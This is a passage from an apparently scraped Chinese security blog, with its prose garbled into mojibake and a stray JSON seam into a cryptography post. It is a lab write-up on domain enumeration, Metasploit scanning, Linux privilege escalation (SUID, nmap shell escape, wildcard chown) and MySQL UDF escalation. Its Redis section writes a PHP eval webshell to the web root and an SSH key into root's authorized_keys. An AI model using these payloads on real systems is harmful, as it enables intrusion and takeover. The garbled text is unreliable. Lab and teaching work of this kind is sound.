#æŸ¥çœ‹åŸŸç®¡ç†å‘˜ net group &quot;domain controllers&quot; /domain #æŸ¥çœ‹åŸŸæ§ æ±‡æ€» ä»åŸŸä¿¡æ¯æ”¶é›†å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š åŸŸï¼šgod.org åŸŸå†…æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼šadministratorã€ligangã€liukaifeng01 åŸŸå†…æœ‰ä¸‰å°ä¸»æœºï¼šDEV1(ä¸åœ¨æ­¤ç¯å¢ƒä¸­)ã€ROOT-TVI862UBEHã€STU1 åŸŸæ§ï¼šOWA(192.168.52.138) åŸŸç®¡ç†å‘˜ï¼šadministrator ç”±æ­¤å¯è§ï¼Œæˆ‘ä»¬ç°åœ¨è·å¾—çš„å³æ˜¯åŸŸç®¡ç†å‘˜æƒé™ã€‚æ­¤ç¯å¢ƒå†…è¿˜æœ‰ä¸€å°ROOT-TVI862UBEH(192.168.52.141)å’ŒåŸŸæ§OWA(192.168.52.138)ã€‚ å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†è¿œç¨‹ç™»å½•æ¡Œé¢åä¼šçœ‹åˆ°ä¸€ä¸ªNmapåº”ç”¨ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ¢æµ‹å†…ç½‘ä¸»æœº å½“ç„¶ä¹‹å‰å·²ç»è®¾ç½®å®Œä»£ç†äº†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨kaliä¸­çš„msfæ¢æµ‹ å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹å› ä¸ºä¹‹å‰çš„ä»£ç†æ­å»ºå­˜åœ¨é—®é¢˜ï¼Œå¯¼è‡´è¿™ä¸€æ­¥ä¸èƒ½åšï¼Œå°±åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€äº›ç›¸å…³æ“ä½œ åœ¨åŸŸç¯å¢ƒæ¸—é€ä¸­å¯ä»¥çœç•¥ï¼Œå› ä¸ºä½¿ç”¨åŸŸå‘½ä»¤å¯ä»¥ç›´æ¥æŸ¥è¯¢åŸŸä¸­æœ‰å“ªäº›ä¸»æœºã€‚åœ¨éåŸŸç¯å¢ƒä¸­æ¸—é€ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸€æ­¥ã€‚åœ¨è¿™é‡Œé¡ºå¸¦æä¸€ä¸‹è¿™ä¸ªç”¨æ³•ã€‚æ›´å¤šçš„å…³äºä½¿ç”¨MSFè¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œä¼ é€é—¨ï¼šåæ¸—é€é˜¶æ®µä¹‹åŸºäºMSFçš„å†…ç½‘ä¸»æœºæ¢æµ‹ auxiliary/scanner/discovery/udp_sweep #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/discovery/udp_probe #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº auxiliary/scanner/netbios/nbname #åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æä½¿ç”¨MSFè‡ªå¸¦æ¨¡å—è¿›è¡Œç«¯å£æ¢æµ‹ auxiliary/scanner/portscan/tcp #åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(é»˜è®¤æ‰«æ1-10000) ä¹Ÿå¯ä»¥ç”¨nmapæ‰«æ å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹auxiliary/scanner/ftp/ftp_version #å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£ auxiliary/scanner/ssh/ssh_version #å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£ auxiliary/scanner/telnet/telnet_version #å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£ auxiliary/scanner/dns/dns_amp #å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£ auxiliary/scanner/http/http_version #å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£ auxiliary/scanner/http/title #æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜ auxiliary/scanner/smb/smb_version #å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£ auxiliary/scanner/mssql/mssql_schemadump #å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£ auxiliary/scanner/oracle/oracle_hashdump #å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£ auxiliary/scanner/mysql/mysql_version #å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£ auxiliary/scanner/rdp/rdp_scanner #å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£ auxiliary/scanner/redis/redis_server #å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£ auxiliary/scanner/db2/db2_version #æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„50000ç«¯å£ auxiliary/scanner/netbios/nbname #æ¢æµ‹å†…ç½‘ä¸»æœºçš„netbiosåå­— ææƒå¤ç°é€šé…ç¬¦ææƒç®€ä»‹é€šé…ç¬¦æ˜¯ä¸€ä¸ªå­—ç¬¦æˆ–ä¸€ç»„å­—ç¬¦ï¼Œå¯ä»¥ç”¨æ¥æ›¿æ¢æŸäº›èŒƒå›´/ç±»åˆ«çš„å­—ç¬¦ã€‚åœ¨æ‰§è¡Œä»»ä½•å…¶ä»–æ“ä½œä¹‹å‰ï¼Œé€šé…ç¬¦é¦–å…ˆè¦ç»è¿‡shellè¿›è¡Œè§£é‡Šã€‚ ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„é€šé…ç¬¦ï¼š * æ˜Ÿå·å¯ä»¥ä¸æ–‡ä»¶åä¸­çš„ä»»æ„æ•°é‡çš„å­—ç¬¦åŒ¹é…ï¼ŒåŒ…æ‹¬0ä¸ªå­—ç¬¦ã€‚ ? é—®å·ç”¨äºåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ã€‚ [ ] æ‹¬å·å†…åŒ…æ‹¬ä¸€ç»„å­—ç¬¦ï¼Œå…¶ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½å¯ä»¥åŒ¹é…è¯¥ä½ç½®ä¸Šçš„å•ä¸ªå­—ç¬¦ã€‚ â€“ []ä¸­çš„è¿å­—ç¬¦è¡¨ç¤ºå­—ç¬¦èŒƒå›´ã€‚ ~ å•è¯å¼€å¤´çš„æ³¢æµªç¬¦è¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•çš„åç§°ã€‚å¦‚æœè¯¥å­—ç¬¦åé¢æ˜¯å¦ä¸€ä¸ªç”¨æˆ·çš„ç™»å½•åï¼Œåˆ™è¡¨ç¤ºè¯¥ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚ åˆ©ç”¨chownçš„--referenceå‚æ•°ææƒ â€“reference=&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt;ï¼šæŠŠæŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…ä¸æ‰€å±ç»„ï¼Œç»Ÿç»Ÿè®¾ç½®æˆå’Œå‚è€ƒæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…ä¸æ‰€å±ç»„ç›¸åŒã€‚ æœ¬åœ°ææƒå®éªŒç¯å¢ƒubuntu18.04 é¦–å…ˆåˆ›å»ºä¸€ä¸ªhackerç”¨æˆ· adduser hacker ç™»å½•sunzyè´¦å·ï¼Œåœ¨home/sunzy/test éšä¾¿å†™ä¸€äº›æ–‡ä»¶ï¼Œä½œä¸ºå®éªŒå‚è€ƒå¯¹è±¡ ç™»å½•hackerè´¦å·ï¼Œå¹¶ä¸”åœ¨testç›®å½•ä¸‹å†™ä¸¤ä¸ªæ–‡ä»¶ è¿™é‡Œéœ€è¦å®éªŒsuå‘½ä»¤æå‡æƒé™ï¼Œå¹¶ä¸”å°†æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„æ”¹ä¸ºhacker å…¶ä¸­hacker.phpä¸â€™â€“reference=hacker.phpâ€™ä¸­çš„åå­—éœ€è¦ä¸€è‡´ ä½¿ç”¨rootæƒé™åœ¨/home/sunzy/test/æ‰§è¡Œ chown -R hacker1:hacker1 *.php ç»“æœå¦‚ä¸‹ï¼Œå‘ç°ï¼Œå±äºsunzyç”¨æˆ·çš„æ–‡ä»¶ï¼Œç°åœ¨å±äºhackerï¼Œè¿™æ ·hackerå°±å¯ä»¥å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œã€‚ linux SUIDææƒå…³äºSUIDSUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚ æŸ¥æ‰¾å…·æœ‰ SUID æƒé™ä½æ–‡ä»¶ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚å‡†ç¡®çš„è¯´ï¼Œè¿™ä¸ªå‘½ä»¤å°†ä»/ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ; ä¹Ÿå¯ä»¥ä½¿ç”¨ sudo -l å‘½ä»¤åˆ—å‡ºå½“å‰ç”¨æˆ·å¯æ‰§è¡Œçš„å‘½ä»¤ ææƒnmap nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ nmap --interactive ä¹‹åæ‰§è¡Œ: nmap&gt; !sh sh-3.2# whoami root msfä¸­çš„æ¨¡å—ä¸ºï¼š exploit/unix/local/setuid_nmap è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ --script å‚æ•°ï¼š echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse kali nmap 7.7 ææƒæˆåŠŸï¼š mysql UDFææƒUDFææƒåŸç†UDFæŒ‡çš„æ˜¯ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥å¯¹æ•°æ®åº“æ‰€ä½¿ç”¨çš„å‡½æ•°è¿›è¡Œä¸€ä¸ªæ‰©å±•ï¼ˆåˆ©ç”¨dllæ–‡ä»¶ï¼‰ï¼Œä»è€Œå®šåˆ¶ä¸€äº›ç¬¦åˆè‡ªå·±éœ€æ±‚çš„å‡½æ•°ï¼Œä½†æ˜¯åŒæ ·çš„ï¼Œå½“é»‘å®¢è·å–äº†æ•°æ®åº“çš„rootç”¨æˆ·çš„ä¸€ä¸ªæƒé™æ—¶ï¼Œå³ä½¿æ‰€åœ¨çš„ç³»ç»Ÿæƒé™å¾ˆä½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨UDFæ¥è‡ªå®šä¹‰ä¸€ä¸ªæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œä½†æ˜¯æ‰§è¡Œæƒé™ä¸ºç®¡ç†å‘˜æƒé™ï¼Œä»è€Œå¯ä»¥ç”¨æ¥æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·ï¼Œè¿œç¨‹è¿æ¥ã€‚ è¿™é‡Œä½¿ç”¨mysqlè¿›è¡Œå¤ç°ã€‚ é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‹¥æœ‰mysqlæ•°æ®åº“çš„rootæƒé™ï¼Œç”±äºmysqlçš„ç‰ˆæœ¬ä¸åŒï¼Œudfææƒçš„æ–¹å¼ä¹Ÿä¸åŒã€‚ mysqlç‰ˆæœ¬&gt;5.1 éœ€è¦åœ¨mysqlçš„å®‰è£…ç›®å½•ä¸‹åˆ›å»º lib\\plugin è¿™ä¸ªæ–‡ä»¶å¤¹ï¼ˆé»˜è®¤ä¸å­˜åœ¨ï¼‰ï¼Œä¹‹åå°†æŠŠdllæ–‡ä»¶æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼›mysqlç‰ˆæœ¬&lt;5.1 éœ€è¦å°†dllæ–‡ä»¶æ”¾åœ¨ C:\\windows\\æˆ–C:\\windows\\system32ã€‚ ç„¶ååŠ è½½å‡½æ•°ï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚ æ³¨æ„ï¼šææƒæ‰€ç”¨çš„dllåœ¨sqlmapæˆ–msfä¸­éƒ½æœ‰ï¼Œè¦ä¸å—å®³æœºçš„ç³»ç»Ÿä¸æ•°æ®åº“ä½æ•°è¿›è¡ŒåŒ¹é…ã€‚ msfææƒæ¼”ç¤ºè¿™é‡Œä¸»è¦æ¼”ç¤ºå¤§äº5.1çš„ç‰ˆæœ¬ã€‚æ‰€ä»¥æ¥ä¸‹æ¥åˆ›å»ºç›®å½•ï¼Œå…³äºåˆ›å»ºç›®å½•ï¼Œä¸‹é¢çš„ç¬¬äºŒç¯‡å‚è€ƒæä¾›äº†ä¸€ä¸ªä½¿ç”¨NTFS ADSæµçš„æ–¹å¼ï¼Œå¤§å®¶å¯ä»¥è¿›è¡Œå°è¯•ï¼Œè¿™é‡Œæˆ‘ç›´æ¥æ‰‹å·¥è¿›è¡Œåˆ›å»ºã€‚ ç„¶åæˆ‘ä»¬éœ€è¦æŠŠè‡ªå®šä¹‰å¥½çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°åŠ è½½è¿›æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°†å®šä¹‰å¥½çš„ä¸€ä¸ªdllæ”¾å…¥lib\\pluginè¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿™é‡Œå¦‚æœæ— æ³•ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨ï¼Œå°†dllä¸­çš„æ•°æ®åå…­è¿›åˆ¶ç¼–ç ï¼Œä¹‹ååœ¨é€šè¿‡è¯»å–çš„æ–¹å¼å†™å…¥åˆ°lib\\plugin\\udf.dllæ–‡ä»¶ä¸­ï¼Œè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°ä¸Šä¼ æ–‡ä»¶çš„æ•ˆæœçš„ã€‚å†™å…¥æ–‡ä»¶æœ‰ä¸€ä¸ªå‰æï¼Œå°±æ˜¯secure_file_privè¿™ä¸ªé€‰é¡¹éœ€è¦ä¸ºç©ºå€¼ï¼Œè¿™æ ·æ‰å¯ä»¥åŠ è½½æˆ–å†™å…¥æ–‡ä»¶ã€‚ NULLè¡¨ç¤ºä¸å¯ä»¥å†™å…¥ä¿®æ”¹mysql.iniæ–‡ä»¶ï¼Œä½¿å…¶ä¸ºç©ºå€¼ è¿™æ ·ä¸€æ¥å°±å¯ä»¥å†™å…¥æ–‡ä»¶äº†ã€‚ ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨msfè¿›è¡Œæ”»å‡»ï¼Œéœ€è¦è¿œç¨‹è¿æ¥è¯¥ä¸»æœºçš„æ•°æ®åº“ï¼Œæ‰€ä»¥è¦æå‰æŸ¥çœ‹ï¼Œè¯¥æ•°æ®åº“æ˜¯å¦å¯ä»¥è¿œç¨‹è¿æ¥ã€‚ è¿™é‡Œå‘ç°rootç”¨æˆ·çš„è¿æ¥å¯¹è±¡éƒ½æ˜¯æœ¬åœ°ï¼Œå¯ä»¥ä½¿ç”¨sqlè¯­å¥è¿›è¡Œä¿®æ”¹ï¼Œå°†å…¶æ”¹ä¸ºå…è®¸è¿œç¨‹è¿æ¥ update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; è¿™æ¡è¯­å¥æ¥ä¿®æ”¹è¿æ¥å¯¹è±¡ä¸ºæ‰€æœ‰ä¸»æœºä¹‹åå°è¯•ä½¿ç”¨msfè¿›è¡Œæ”»å‡»ã€‚ è¿›å…¥msfï¼ŒåŠ è½½exploit/multi/mysql/mysql_udf_payloadæ¨¡å— è¿™é‡Œçš„éœ€è¦mysqlæ•°æ®åº“çš„è´¦å·å’Œå¯†ç ï¼Œä»¥åŠè¿æ¥çš„ä¸»æœºã€‚è®¾ç½®å®Œä¹‹åï¼Œå°è¯•æ”»å‡»ã€‚æ”»å‡»å®Œä¹‹åï¼Œåœ¨å—å®³æœºçš„lib\\pluginç›®å½•ä¸‹å°†ä¼šç”Ÿæˆä¸€ä¸ªdllæ–‡ä»¶ã€‚ä¹‹åæŸ¥çœ‹å·²è½½å…¥çš„å‡½æ•°å¹¶å°è¯•æ‰§è¡Œã€‚ æ‰§è¡ŒæˆåŠŸè¿”å›0ã€‚ç”±äºè¯¥å‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨çš„åŠ è½½ä¸€ä¸ªæœ‰å›æ˜¾çš„å‡½æ•°ã€‚ è¿™é‡Œçš„dllæ–‡ä»¶çš„åç§°æ˜¯msféšæœºçš„ï¼Œåˆ©ç”¨è¯¥æ¡å‘½ä»¤è½½å…¥äº†sys_evalå‡½æ•° å¯ä»¥çœ‹åˆ°è¯¥æ¡å‡½æ•°æˆåŠŸå°†æ‰§è¡Œç»“æœå›æ˜¾å‡ºæ¥äº†ã€‚ redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨æ¼æ´ç®€ä»‹Rediså› é…ç½®ä¸å½“å°±ä¼šå¯¼è‡´æœªæˆæƒè®¿é—®ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedisä¼šç»‘å®šåœ¨ 0.0.0.0:6379ã€‚å¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ · Redis æœåŠ¡ç›´æ¥æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®åˆ°ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ Redis è‡ªèº«æä¾›çš„config å‘½ä»¤è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚ è¯¥æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š 1.redisç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼›2.æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç (è®¤è¯)è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚ æ¼æ´å±å®³ï¼š(1) æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ï¼›(2) æ”»å‡»è€…å¯é€šè¿‡æ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶ï¼›(3) æœ€ä¸¥é‡çš„æƒ…å†µï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨; ç¯å¢ƒæ­å»ºåœ¨kaliä¸­å®‰è£…redis 3.2.0 åˆ›å»ºrediså®‰è£…ç›®å½• mkdir /usr/local/redis cd /usr/local/redis/ wget http://download.redis.io/releases/redis-3.2.0.tar.gz //è·å–rediså‹ç¼©åŒ… tar xzf redis-3.2.0.tar.gz cd /usr/local/redis/redis-3.2.0 make #ç¼–è¯‘å®‰è£… å®‰è£…å®Œæˆä¹‹åéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œé…ç½®å…è®¸å¯ä»¥è¿œç¨‹è®¿é—®ã€‚ vim redis.conf #ä¿®æ”¹é»˜è®¤é…ç½®æ–‡ä»¶ åœ¨bind 127.0.0.1å‰é¢åŠ ä¸Š#å·è¿›è¡Œæ³¨é‡Šï¼Œå¹¶å°†protected-modeè®¾ç½®ä¸ºnoã€‚ ç„¶åè¿›å…¥srcç›®å½•ï¼Œå°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰ï¼Œå¹¶å°†redis.confæ‹·è´åˆ°/etc/ç›®å½•ä¸‹ã€‚ cd src cp redis-cli /usr/bin cp redis-server /usr/bin cp redis.conf /etc/ å¼€å¯redisæœåŠ¡ redis-server /etc/redis.conf ç¬¬ä¸€å°ä½œä¸ºæ”»å‡»æœºå³å¯ï¼Œç„¶åå°†è¿™å°ä¸»æœºå…‹éš†ä½œä¸ºç›®æ ‡ä¸»æœº æ”»å‡»æœº ip:192.168.164.145 ç›®æ ‡ä¸»æœº ip:192.168.164.23 é¦–å…ˆç¡®å®šç›®æ ‡ä¸»æœºæ˜¯å¦å¼€å¯redisæœåŠ¡ï¼Œä½¿ç”¨nmapæ‰«æç«¯å£6379 å¦‚ä¸‹ï¼Œæ˜¾ç¤ºäº†ç›®æ ‡ä½¿ç”¨çš„redisç‰ˆæœ¬ä»¥åŠæœåŠ¡å™¨çš„ä¿¡æ¯ æ¼æ´åˆ©ç”¨1.å†™å…¥æœ¨é©¬æ–‡ä»¶é¦–å…ˆè¿›å…¥rediså®‰è£…ç›®å½•çš„srcä¸­æ‰§è¡Œ ./redis-cli -h 192.168.164.23 æˆåŠŸæ§åˆ¶ç›®æ ‡çš„redisæœåŠ¡ å‘å…¶ç½‘ç«™æ ¹ç›®å½•ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ config set dir /var/www/html config set dbfilename shell.php set x &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; save saveæˆåŠŸåï¼Œç›®æ ‡ä¸»æœºçš„ç½‘ç«™æ ¹ç›®å½•å°±å‡ºç°äº†æœ¨é©¬æ–‡ä»¶ ä½¿ç”¨èšå‰‘è¿æ¥ 2.å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†å†™å…¥sshå…¬é’¥åå¯ä»¥åœ¨æœ¬æœºå­˜å‚¨å¯¹åº”çš„sshå¯†é’¥ï¼Œç„¶åç›´æ¥æ— å¯†ç ç™»é™†ã€‚ é¦–å…ˆç”Ÿæˆå…¬é’¥å¯†é’¥æ–‡ä»¶ ssh-keygen -t rsa cat /root/.ssh/id_rsa.pub ç»§ç»­ä½¿ç”¨å‘½ä»¤ config set dir /root/.ssh/ config set authorized_keys set x &quot;\\n\\n\\n\\id_rsa.pubçš„å†…å®¹\\n\\n\\n&quot; save ä½¿ç”¨å…¬é’¥è¿æ¥ ssh -i id_rsa root@192.168.164.23 è¿™é‡Œçš„id_rsaä¸åˆ›å»ºsshå¯†é’¥è¾“å…¥çš„å†…å®¹ä¸€è‡´ 3.åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shellåªèƒ½åœ¨centosç¯å¢ƒä¸­åˆ©ç”¨å› ä¸ºcentosç¯å¢ƒä¸­çš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶å¯ä»¥å¿½ç•¥ä¹±ç ï¼Œubuntuç¯å¢ƒå› ä¸ºæ— æ³•å¿½ç•¥æ–‡ä»¶ä¸­çš„ä¹±ç å› æ­¤æ— æ³•ä½¿ç”¨ æ¼æ´ä¿®å¤1ã€é™åˆ¶ç™»å½•ipåœ¨redis.confæ–‡ä»¶ä¸­è®¾ç½®redisè®¿é—®çš„ipç™½åå•ï¼Œå¦‚æœé¡¹ç›®å…è®¸çš„è¯æœ€å¥½è®¾ç½®ä¸ºåªå…è®¸æœ¬åœ°è®¿é—®ã€‚ 2ã€æ·»åŠ å¯†ç åœ¨redis.confé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°requirepasså¹¶å»æ‰å‰é¢çš„#ï¼Œ ç„¶ååœ¨åé¢è®¾ç½®ä¸€ä¸ªé«˜å¼ºåº¦çš„å¯†ç ã€‚å› ä¸ºrediséªŒè¯å¯†ç çš„é€Ÿåº¦å¾ˆå¿«ï¼Œç»™æ”»å‡»è€…è¿›è¡Œé«˜é€Ÿçš„çˆ†ç ´å¯†ç æä¾›äº†ä¸€ä¸ªè‰¯å¥½çš„åŸºç¡€ï¼Œæ‰€ä»¥è®¾ç½®ä¸€ä¸ªé«˜å¼ºåº¦çš„å¯†ç ä¸ä»…è§£å†³äº†æœªæˆæƒçš„é—®é¢˜è¿˜èƒ½é˜²æ­¢å¯†ç çˆ†ç ´ã€‚ 3ã€ä¿®æ”¹é»˜è®¤ç«¯å£","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"xxe","slug":"xxe","permalink":"https://sunzhengyu99.github.io/tags/xxe/"}]},{"title":"å¯†ç å­¦","date":"2020-12-23T08:37:43.000Z","path":"2020/12/23/å¯†ç å­¦/","text":"å¯†ç å­¦å®éªŒè¯¾ç¨‹è®¾è®¡ ä¸€ã€å¤å…¸å¯†ç ä»¿å°„å¯†ç ç®€ä»‹ä»¿å°„åŠ å¯†åœ¨æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªç½®æ¢å¯†ç ï¼šå¦‚æœè¯´ç§»ä½å¯†ç æ˜¯ä¸€ä¸ªå¸¸æ•°çº§åˆ«çš„ç½®æ¢ï¼Œé‚£ä¹ˆï¼Œä»¿å°„åŠ å¯†æ˜¯ä¸€ä¸ªä¸€æ¬¡çº§åˆ«çš„ç½®æ¢ åŠ å¯†åŸç†å‡è®¾Xï¼ŒYï¼ŒAï¼ŒBæ˜¯Z26æ•´æ•°ç¯ä¸­çš„å…ƒç´ ï¼ŒAå’ŒBä¸ºå¯†é’¥ï¼ŒXæ˜¯åŸæ–‡ï¼ŒYæ˜¯å¯†æ–‡ åŠ 